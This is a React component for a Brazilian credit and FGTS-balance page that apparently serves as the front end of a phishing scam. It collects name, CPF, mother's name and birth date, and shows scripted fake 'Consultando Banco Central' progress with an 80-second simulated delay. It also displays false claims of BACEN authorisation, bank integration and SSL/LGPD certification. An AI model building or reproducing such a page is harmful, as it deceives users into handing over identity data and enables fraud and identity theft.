function Hero({ onConsulta }) {
  try {
  const [nome, setNome] = React.useState('');
  const [cpf, setCpf] = React.useState('');
  const [mae, setMae] = React.useState('');
  const [nascimento, setNascimento] = React.useState('');
  const [loading, setLoading] = React.useState(false);
  const [error, setError] = React.useState('');
  const [tipoSelecionado, setTipoSelecionado] = React.useState('');

    const handleCpfChange = (e) => {
      const value = e.target.value;
      const formattedCpf = formatCPF(value);
      setCpf(formattedCpf);
    };

    const handleSubmit = async (tipo) => {
      setError('');
      
      if (!nome.trim()) {
        setError('Por favor, digite seu nome completo');
        return;
      }
      
      if (!cpf.trim() || cpf.replace(/\D/g, '').length !== 11) {
        setError('Por favor, digite um CPF válido com 11 dígitos');
        return;
      }

      if (!validateCPF(cpf)) {
        setError('CPF inválido');
        return;
      }

      if (!mae.trim()) {
        setError('Por favor, digite o nome completo da sua mãe');
        return;
      }

      if (!nascimento.trim()) {
        setError('Por favor, digite sua data de nascimento');
        return;
      }

      setTipoSelecionado(tipo);
      setLoading(true);
      
      // Simula tempo de processamento mais realista com mensagens de sistema
      const mensagens = [
        '🔍 Verificando dados no sistema...',
        '🏦 Consultando Banco Central...',
        '📊 Analisando histórico financeiro...',
        '✅ Calculando valores disponíveis...',
        '🎯 Preparando sua oferta personalizada...'
      ];
      
      let mensagemIndex = 0;
      const interval = setInterval(() => {
        if (mensagemIndex < mensagens.length - 1) {
          mensagemIndex++;
          // Aqui você pode atualizar uma mensagem na tela se quiser
        }
      }, 1500);
      
      setTimeout(() => {
        clearInterval(interval);
        setLoading(false);
        onConsulta({ nome, cpf, mae, nascimento }, tipo);
      }, 80000);
    };

    return (
      <section className="bg-gradient-to-br from-[var(--primary-color)] to-orange-700 text-white relative overflow-hidden" data-name="hero" data-file="components/Hero.js">
        <div className="section-padding">
          <div className="grid md:grid-cols-2 gap-12 items-center">
            {/* Conteúdo */}
            <div>
              <h1 className="text-3xl md:text-5xl font-bold mb-8 text-shadow leading-tight">
                Análise de Crédito
                <span className="text-yellow-300 block mt-2">Personalizada e Imediata</span>
              </h1>
              
              <p className="text-xl md:text-2xl mb-10 text-blue-100 leading-relaxed">
                ✅ Avaliação creditícia especializada<br/>
                ✅ Condições preferenciais garantidas<br/>
                ✅ Tecnologia bancária segura
              </p>

              <div className="flex flex-col gap-4 mb-10">
                <button 
                  onClick={() => document.getElementById('formulario-consulta').scrollIntoView({ behavior: 'smooth' })}
                  className="mobile-button bg-white text-[var(--primary-color)] hover:bg-gray-100"
                >
                  <div className="flex items-center justify-center space-x-3">
                    <div className="icon-calculator text-2xl"></div>
                    <span>💼 Simular Limite de Crédito</span>
                  </div>
                </button>
                <button 
                  onClick={() => document.getElementById('formulario-consulta').scrollIntoView({ behavior: 'smooth' })}
                  className="mobile-button border-2 border-white text-white hover:bg-white hover:text-[var(--primary-color)]"
                >
                  <div className="flex items-center justify-center space-x-3">
                    <div className="icon-piggy-bank text-2xl"></div>
                    <span>🏦 Consultar Saldo FGTS</span>
                  </div>
                </button>
              </div>

              {/* Indicadores Profissionais */}
              <div className="grid grid-cols-3 gap-4 mb-8">
                <div className="text-center bg-white bg-opacity-20 rounded-2xl p-4">
                  <div className="text-3xl mb-2">🏦</div>
                  <div className="text-xl font-bold text-white">BACEN</div>
                  <div className="text-sm text-orange-200">Autorizado</div>
                </div>
                <div className="text-center bg-white bg-opacity-20 rounded-2xl p-4">
                  <div className="text-3xl mb-2">💼</div>
                  <div className="text-xl font-bold text-white">500K</div>
                  <div className="text-sm text-orange-200">Até R$</div>
                </div>
                <div className="text-center bg-white bg-opacity-20 rounded-2xl p-4">
                  <div className="text-3xl mb-2">📊</div>
                  <div className="text-xl font-bold text-white">0,99%</div>
                  <div className="text-sm text-orange-200">Taxa a.m.</div>
                </div>
              </div>

              {/* Bancos Parceiros */}
              <div className="bg-white bg-opacity-15 rounded-2xl p-6 backdrop-blur-sm">
                <p className="text-center text-white font-semibold mb-4 text-lg">
                  🏛️ Conectado aos Principais Bancos:
                </p>
                <div className="grid grid-cols-2 gap-3">
                  <div className="bg-white bg-opacity-20 rounded-lg p-3 flex items-center justify-center">
                    <span className="text-white font-bold text-sm">🟡 Banco do Brasil</span>
                  </div>
                  <div className="bg-white bg-opacity-20 rounded-lg p-3 flex items-center justify-center">
                    <span className="text-white font-bold text-sm">🔴 Bradesco</span>
                  </div>
                  <div className="bg-white bg-opacity-20 rounded-lg p-3 flex items-center justify-center">
                    <span className="text-white font-bold text-sm">🟣 Nubank</span>
                  </div>
                  <div className="bg-white bg-opacity-20 rounded-lg p-3 flex items-center justify-center">
                    <span className="text-white font-bold text-sm">🔵 Caixa</span>
                  </div>
                  <div className="bg-white bg-opacity-20 rounded-lg p-3 flex items-center justify-center">
                    <span className="text-white font-bold text-sm">🟠 Itaú</span>
                  </div>
                  <div className="bg-white bg-opacity-20 rounded-lg p-3 flex items-center justify-center">
                    <span className="text-white font-bold text-sm">🟢 Santander</span>
                  </div>
                </div>
                <p className="text-center text-orange-200 text-sm mt-4">
                  ✅ Sistema integrado para consulta automática
                </p>
              </div>
            </div>

            {/* Formulário de Consulta Profissional */}
            <div id="formulario-consulta" className="flex justify-center">
              <div className="bg-white bg-opacity-98 rounded-3xl p-8 backdrop-blur-sm shadow-2xl border-2 border-white border-opacity-30 relative">
                <div className="absolute -top-3 left-1/2 transform -translate-x-1/2 bg-[var(--primary-color)] text-white px-6 py-1 rounded-full text-sm font-bold">
                  🔒 CONSULTA SEGURA
                </div>
                <div className="w-full max-w-md mx-auto">
                  <div className="text-center mb-8">
                    <div className="w-20 h-20 bg-gradient-to-br from-orange-600 to-orange-700 rounded-full flex items-center justify-center mx-auto mb-4 shadow-2xl">
                      <div className="icon-search text-3xl text-white"></div>
                    </div>
                    <h3 className="text-2xl font-bold text-[var(--text-primary)] mb-2">
                      Análise Creditícia Corporativa
                    </h3>
                    <p className="text-[var(--text-secondary)] text-base">
                      Avaliação especializada e confidencial
                    </p>
                    <div className="bg-gradient-to-r from-orange-50 to-yellow-50 rounded-xl p-3 mt-4 border border-orange-200">
                      <p className="text-orange-700 font-semibold text-sm">
                        🔐 Segurança bancária certificada SSL/LGPD
                      </p>
                    </div>
                  </div>
                  
                  <div className="space-y-6">
                    <div>
                      <label className="block text-lg font-bold text-[var(--text-primary)] mb-3">
                        👤 Nome Completo do Titular
                      </label>
                      <input
                        type="text"
                        value={nome}
                        onChange={(e) => setNome(e.target.value)}
                        placeholder="Informe seu nome completo conforme documento"
                        disabled={loading}
                        className="mobile-input disabled:bg-gray-50"
                      />
                    </div>
                    
                    <div>
                      <label className="block text-lg font-bold text-[var(--text-primary)] mb-3">
                        🆔 CPF do Titular
                      </label>
                      <input
                        type="text"
                        value={cpf}
                        onChange={handleCpfChange}
                        placeholder="000.000.000-00"
                        maxLength="14"
                        disabled={loading}
                        className="mobile-input disabled:bg-gray-50"
                      />
                    </div>

                    <div>
                      <label className="block text-lg font-bold text-[var(--text-primary)] mb-3">
                        👩 Nome Completo da Genitora
                      </label>
                      <input
                        type="text"
                        value={mae}
                        onChange={(e) => setMae(e.target.value)}
                        placeholder="Conforme certidão de nascimento"
                        disabled={loading}
                        className="mobile-input disabled:bg-gray-50"
                      />
                    </div>

                    <div>
                      <label className="block text-lg font-bold text-[var(--text-primary)] mb-3">
                        📅 Data de Nascimento
                      </label>
                      <input
                        type="date"
                        value={nascimento}
                        onChange={(e) => setNascimento(e.target.value)}
                        disabled={loading}
                        className="mobile-input disabled:bg-gray-50"
                      />
                    </div>

                    {error && (
                      <div className="bg-red-50 border-2 border-red-200 text-red-700 px-6 py-4 rounded-2xl text-lg font-semibold">
                        ❌ {error}
                      </div>
                    )}
                    
                    <div className="space-y-4">
                      <button 
                        onClick={() => handleSubmit('emprestimo')}
                        disabled={loading}
                        className="mobile-button bg-gradient-to-r from-green-600 to-green-700 text-white hover:from-green-700 hover:to-green-800 disabled:opacity-50 disabled:cursor-not-allowed shadow-xl transform hover:scale-105 transition-all"
                      >
                        {loading && tipoSelecionado === 'emprestimo' ? (
                          <div className="flex flex-col items-center justify-center space-y-3">
                            <div className="w-6 h-6 border-3 border-white border-t-transparent rounded-full animate-spin"></div>
                            <div className="text-center">
                              <div className="text-lg font-bold">🔍 Processando Análise...</div>
                              <div className="text-sm opacity-90 mt-1">Consultando base de dados bancários</div>
                            </div>
                          </div>
                        ) : (
                          <div className="flex items-center justify-center space-x-3">
                            <span>💼 Solicitar Análise de Crédito</span>
                          </div>
                        )}
                      </button>
                      
                      <button 
                        onClick={() => handleSubmit('fgts')}
                        disabled={loading}
                        className="mobile-button bg-gradient-to-r from-blue-600 to-blue-700 text-white hover:from-blue-700 hover:to-blue-800 disabled:opacity-50 disabled:cursor-not-allowed shadow-xl transform hover:scale-105 transition-all"
                      >
                        {loading && tipoSelecionado === 'fgts' ? (
                          <div className="flex flex-col items-center justify-center space-y-3">
                            <div className="w-6 h-6 border-3 border-white border-t-transparent rounded-full animate-spin"></div>
                            <div className="text-center">
                              <div className="text-lg font-bold">🔍 Processando Consulta...</div>
                              <div className="text-sm opacity-90 mt-1">Verificando saldos disponíveis</div>
                            </div>
                          </div>
                        ) : (
                          <div className="flex items-center justify-center space-x-3">
                            <span>🏦 Verificar Saldo FGTS Disponível</span>
                          </div>
                        )}
                      </button>
                    </div>

                    <div className="text-center bg-gradient-to-r from-green-50 to-blue-50 p-4 rounded-2xl border border-green-200">
                      <div className="flex items-center justify-center space-x-2 mb-2">
                        <div className="text-2xl">🔒</div>
                        <p className="text-lg text-green-700 font-bold">
                          Protocolo de Segurança Bancária
                        </p>
                      </div>
                      <div className="flex items-center justify-center space-x-4 text-sm text-green-600">
                        <span>✅ Certificação SSL</span>
                        <span>✅ Autorização BACEN</span>
                        <span>✅ Proteção LGPD</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
    );
  } catch (error) {
    console.error('Hero component error:', error);
    return null;
  }
}
